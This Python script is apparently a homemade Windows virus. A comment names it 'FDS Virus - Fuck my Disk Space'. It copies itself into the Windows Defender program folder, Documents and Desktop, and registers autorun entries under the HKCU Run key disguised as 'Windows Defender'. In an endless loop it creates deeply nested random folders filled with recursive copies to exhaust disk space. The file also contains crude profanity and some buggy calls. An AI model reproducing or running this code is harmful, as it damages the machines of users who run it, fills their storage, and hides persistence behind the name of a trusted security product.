import tempfile
import random
import shutil
import os
from distutils.dir_util import copy_tree
from time import  sleep
import getpass
sortletter = []



tempdir = tempfile.gettempdir()
list(tempdir)

formatteddir = tempdir.split('\\')
# print(formatteddir)
# x = range(1000,1000000000000)
driveletter = str(formatteddir[0])
print(f'Found drive letter {driveletter}' )
username = getpass.getuser()
path_videos = f'\\Users\\{str(username)}\\Video'


address = driveletter + path_videos
print("Video path found :")
print(address)
path = os.path.dirname(os.path.realpath(__file__))
filename =os.path.basename(__file__)
fullpath = os.path.join(path,filename)
print('\n\n\n\nFile path successfully found(Self Path!!)')
print(fullpath)
print("2")
triggeringMMI = False


cdrive = formatteddir[0]
users = r'\Users'
userpath = os.path.join(cdrive,users)

pf86 = r'\Program Files (x86)\Windows Defender'


dcmnts = r'\Documents'


desktop = r'\Desktop'

print("\n\n//Done making variables.")



def destination1():
   
    global fullpath,newfoldr
    newfoldr= os.path.join(cdrive,pf86)
    print(fullpath)
    print(newfoldr)
    shutil.copy(fullpath, newfoldr)
    print('destination 1 successful')

def destination2():
    global fullpath, newfoldr1
    newfoldr1 = os.path.join(userpath,username)
    newfoldr1 = os.path.join(newfoldr1,dcmnts)
    shutil.copy(fullpath,newfoldr1)
    print('destination 2 successful')

def destination3():
    global fullpath,newfoldr2
    newfoldr2 = os.path.join(userpath,username)
    newfoldr2 = os.path.join(newfoldr2,desktop)
    print(newfoldr2)
    shutil.copy(fullpath, newfoldr2)
    print('destination 3 successful')

    # write one more destination like the above one

#Make me Immune
def MMI():
    

    try:
        destination1()

    except:
        try:
            print('Destination failed trying destination 2')
            destination2()
        except:
            try:
                print("Destination 2 failed trying destinationn 3")
                destination3()
            except:
                print("Failed all destinations, failed MMI")
                # print("")
def REGEDIT():
    errorraised = False
    try:
        import winreg
    except ImportError:
        print("Operating system not windows.")
        errorraised = True
    if errorraised == False:
        print("Trying to regedit base path")
        path = os.path.dirname(os.path.realpath(__file__))
        name = 'main.py'
        address = os.path.join(path, name)

        key = winreg.HKEY_CURRENT_USER
        key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
        open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
        winreg.CloseKey(open)
    if triggeringMMI == True:
        try:
            print("Trying to regedit all of them")
            path = newfoldr
            name = 'main.py'
            address = os.path.join(path, name)

            key = winreg.HKEY_CURRENT_USER
            key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
            open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
            winreg.CloseKey(open)
            #2nd regedit
            path = newfoldr1
            name = 'main.py'
            address = os.path.join(path, name)

            key = winreg.HKEY_CURRENT_USER
            key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
            open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
            winreg.CloseKey(open)
            #3rd Regedit
            path = newfoldr2
            name = 'main.py'
            address = os.path.join(path, name)

            key = winreg.HKEY_CURRENT_USER
            key_value = 'Software\Microsoft\Windows\CurrentVersion\Run'
            open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
            winreg.CloseKey(open)

        except:
            try:
                print("Trying to leave pf86 out,regediting the other two. pf86 regedit has failed")
                path = newfoldr1
                name = 'main.py'
                address = os.path.join(path, name)
                print(address)

                key = winreg.HKEY_CURRENT_USER
                key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
                open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
                winreg.CloseKey(open)
                #doing one more
                path = newfoldr2
                name = 'main.py'
                address = os.path.join(path, name)

                key = winreg.HKEY_CURRENT_USER
                key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
                open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
                winreg.CloseKey(open)
            except:
                try:
                    print("pf86 and dcmnts regedit has failed trying the last one.")
                    path = newfoldr2
                    name = 'main.py'
                    address = os.path.join(path, name)

                    key = winreg.HKEY_CURRENT_USER
                    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
                    open = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(open, "Windows Defender", 0, winreg.REG_SZ, address)
                    winreg.CloseKey(open)
                except:
                    print("REGEDIT FAILED IN TOTAL. TRYING ALTERNATIVE FUNCTIONS")
                    try:
                        duplicate()
                    except:
                        sleep(100000)
                        try:
                            duplicate()
                        except:
                            try:
                                REGEDIT()
                            except:
                                print("Fuckin fix the code Light, your suck at programming.")
                                while True:
                                    print(                                                                                                                )

def duplicate():
  

    iterate = 15
    while iterate!= 0:
        
        newfoldername = str(random.randrange(10000, 10000000))
        newfolderitr1 = str(random.randrange(10000000000000000000000, 1000000000000000000000000000000))
        newfolderitr2 = str(random.randrange(10, 20))
        newfolderitr3 = str(random.randrange(100, 110))
        newfolderitr4 = str(random.randrange(1000,10000))
        newfolderitr5 = str(random.randrange(100000,1000000))
        newfolderitr6 = '01010101010101'
        # newfolderitr7 = '010101'
        # newfolderitr8 = 'FDS Virus - Fuck my Disk Space'
        # 1st overlap
        newfolderpath = os.path.join(address,newfoldername)
        os.mkdir(newfolderpath)
        copy_tree(address,newfolderpath)
        #overlap 2
        newfolderitr1path = os.path.join(newfolderpath+ newfolderitr1)
        os.mkdir(newfolderitr1path)
        copy_tree(newfolderpath,newfolderitr1path)
        #overlap 3
        newfolderitr2path = os.path.join(newfolderitr1path,newfolderitr2)
        os.mkdir(newfolderitr2path)
        copy_tree(newfolderitr1path,newfolderitr2path)
        #overlap 4
        newfolderitr3path = os.path.join(newfolderitr2path,newfolderitr3)
        os.mkdir(newfolderitr3path)
        copy_tree(newfolderitr2path,newfolderitr3path)
        #overlap 5
        newfolderitr4path = os.path.join(newfolderitr3path,newfolderitr4)
        os.mkdir(newfolderitr4path)
        copy_tree(newfolderitr3path, newfolderitr4path)
        #overlap 6
        newfolderitr5path =  os.path.join(newfolderitr4path,newfolderitr5)
        os.mkdir(newfolderitr5path)
        copy_tree(newfolderitr4path,newfolderitr5path)
        #overlap 7
        newfolderitr6path = os.path.join(newfolderitr5path,newfolderitr6)
        os.mkdir(newfolderitr6path)
        copy_tree((newfolderitr5path,newfolderitr6path))
        iterate -= 1

while True:
    try:
        MMI()
        REGEDIT()
        duplicate()
        


    except:
        try:
            duplicate()
            MMI()
        except:
            try:
                triggeringMMI = True
                MMI()
                try:    
                    
                    duplicate()
                except:
                    REGEDIT()
            except:
                sleep(1800)
    MMI()







